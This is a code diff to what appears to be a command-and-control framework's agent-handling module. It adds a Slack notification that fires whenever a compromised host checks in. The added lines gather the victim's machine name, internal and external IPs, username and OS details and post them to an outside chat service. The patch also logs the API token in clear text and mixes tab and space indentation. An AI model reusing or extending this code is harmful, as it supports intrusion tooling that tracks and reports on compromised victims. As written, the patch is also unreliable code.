@@ -60,6 +60,7 @@ import os
 import json
 import string
 import threading
+import urllib, urllib2
 from pydispatch import dispatcher
 from zlib_wrapper import compress
 from zlib_wrapper import decompress
@@ -1324,7 +1325,17 @@ class Agents:
             # signal everyone that this agent is now active
             dispatcher.send("[+] Initial agent %s from %s now active" % (sessionID, clientIP), sender='Agents')
             output = "[+] Agent %s now active:\n" % (sessionID)
-
+	    slackToken = listenerOptions['SlackToken']['Value']
+	    slackChannel = listenerOptions['SlackChannel']['Value']
+	    slackMessage = ":biohazard: NEW AGENT :biohazard:\r\n```Machine Name: %s\r\nInternal IP: %s\r\nExternal IP: %s\r\nUser: %s\r\nOS Version: %s\r\nAgent ID: %s```" % (hostname,internal_ip,external_ip,username,os_details,sessionID)
+            dispatcher.send("[+] Checking for Slack token: %s" % slackToken, sender='Agents')
+	    if slackToken != "":
+		# send slack notification
+                url = "https://slack.com/api/chat.postMessage"
+		data = urllib.urlencode({'token': slackToken, 'channel':slackChannel, 'text':slackMessage})
+ 		req = urllib2.Request(url, data)
+ 		resp = urllib2.urlopen(req)
+	    
             # save the initial sysinfo information in the agent log
             agent = self.mainMenu.agents.get_agent_db(sessionID)
             output = messages.display_agent(agent, returnAsString=True)
